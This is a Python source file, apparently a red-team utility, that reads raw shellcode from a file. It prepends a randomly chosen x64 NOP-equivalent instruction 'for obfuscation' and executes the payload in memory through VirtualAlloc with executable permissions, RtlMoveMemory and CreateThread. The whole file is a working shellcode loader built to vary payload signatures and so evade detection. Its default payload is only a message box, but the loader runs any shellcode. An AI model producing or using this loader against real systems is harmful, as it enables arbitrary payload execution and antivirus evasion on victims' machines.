import ctypes
import random
import sys
import argparse


X64_NOPS = {
    b"\x90": "NOP (single byte, standard NOP instruction)",
    b"\x66\x90": "NOP (two-byte variant, used for instruction alignment)",
    b"\x0F\x1F\x00": "NOP DWORD PTR [RAX] (three-byte NOP, Intel recommended)",
    b"\x0F\x1F\x40\x00": "NOP DWORD PTR [RAX+0] (four-byte NOP)",
    b"\x0F\x1F\x44\x00\x00": "NOP DWORD PTR [RAX+RAX*1+0] (five-byte NOP)",
    b"\x0F\x1F\x80\x00\x00\x00\x00": "NOP QWORD PTR [RAX+0] (seven-byte NOP)",
    b"\x0F\x1F\x84\x00\x00\x00\x00\x00": "NOP QWORD PTR [RAX+RAX*1+0] (eight-byte NOP)",
    b"\x66\x0F\x1F\x84\x00\x00\x00\x00\x00": "NOP (nine-byte, long variant for alignment)",
    b"\x87\xDB": "XCHG EBX, EBX (register swap, acts as a NOP)",
    b"\x87\xC9": "XCHG ECX, ECX (similar to above, avoids altering execution)",
    b"\x8D\x49\x00": "LEA ECX, [RCX+0] (no-op using LEA instruction)",
    b"\x8D\x74\x26\x00": "LEA ESI, [RSI+0] (useful for obfuscation)",
    b"\x48\x8D\x64\x24\x00": "LEA RSP, [RSP+0] (avoids register changes)",
    b"\x89\xC0": "MOV EAX, EAX (redundant move, acts as a NOP)",
    b"\x49\x89\xD1": "MOV R9, RDX (acts as NOP if R9 equals RDX)",
    b"\x50\x58": "PUSH RAX / POP RAX (stack operation without effect)",
    b"\x53\x5B": "PUSH RBX / POP RBX (may affect shadow space)",
    b"\x48\xFF\xC0\x48\xFF\xC8": "INC RAX / DEC RAX",
    b"\x83\xC0\x00": "ADD EAX, 0 (acts as a NOP)",
    b"\x83\xE8\x00": "SUB EAX, 0 (does nothing)",
    b"\x04\x00": "ADD AL, 0 (no real effect)",
    b"\x2C\x00": "SUB AL, 0 (same as above)",
    b"\x21\xC0": "AND EAX, EAX (self-AND operation)",
    b"\x83\xC8\x00": "OR EAX, 0 (logical OR with zero)",
    b"\x83\xF0\x00": "XOR EAX, 0 (only changes flags)",
    b"\x48\x87\xC0": "XCHG RAX, RAX (acts as a NOP)",
    b"\x48\x89\xC0": "MOV RAX, RAX (redundant move)",
    b"\x52\x5A": "PUSH RDX / POP RDX (another stack NOP trick)",
    b"\x48\x8D\x40\x00": "LEA RAX, [RAX] (load effective address)",
    b"\x48\x8D\x49\x00": "LEA RCX, [RCX] (acts as a NOP)",
    b"\xD9\xD0": "FNOP (floating-point NOP)",
    b"\xEB\x00": "JMP SHORT $+2 (jumps to itself)",
    b"\x75\x00": "JNZ SHORT $+2 (conditional jump NOP)",
    b"\x74\x00": "JZ SHORT $+2 (jump-based NOP)",
}


def execute_shellcode_with_nop(shellcode_file: str, verbose: bool = False) -> None:
    """Prepends a random NOP instruction to shellcode and executes it in memory."""
    with open(shellcode_file, 'rb') as f:
        shellcode_bytes = f.read()

    nop_bytes, description = random.choice(list(X64_NOPS.items()))
    if verbose:
        print(f"[+] Using NOP: {description}")

    payload = nop_bytes + shellcode_bytes

    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.CreateThread.argtypes = (
        ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int,
        ctypes.c_int, ctypes.POINTER(ctypes.c_int)
    )

    allocation = ctypes.windll.kernel32.VirtualAlloc(
        0, len(payload), 0x3000, 0x40
    )

    buffer = (ctypes.c_char * len(payload)).from_buffer_copy(payload)

    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_void_p(allocation), buffer, len(payload)
    )

    thread_handle = ctypes.windll.kernel32.CreateThread(
        0, 0, ctypes.c_void_p(allocation), 0, 0, ctypes.pointer(ctypes.c_int(0))
    )

    ctypes.windll.kernel32.WaitForSingleObject(thread_handle, 0xFFFFFFFF)


def list_nop_types() -> None:
    print("\nSupported NOP Instructions:")
    for nop, desc in X64_NOPS.items():
        print(f"  {nop.hex():<20} {desc}")
    print()


def main():
    parser = argparse.ArgumentParser(
        description="Execute shellcode with a random x64 NOP prepended for obfuscation.",
        epilog="Example: python3 NOPe_x64.py -f msgbox.x64.bin"
    )
    parser.add_argument(
        "-f", "--file", help="Path to shellcode file (.bin)", default="msgbox.x64.bin"
    )
    parser.add_argument(
        "--list-nops", action="store_true", help="List all supported NOP instruction types"
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true", help="Enable verbose output"
    )

    args = parser.parse_args()

    if args.list_nops:
        list_nop_types()
        sys.exit(0)

    if args.verbose:
        print(f"[+] Loading shellcode from: {args.file}")

    execute_shellcode_with_nop(args.file, args.verbose)


if __name__ == "__main__":
    main()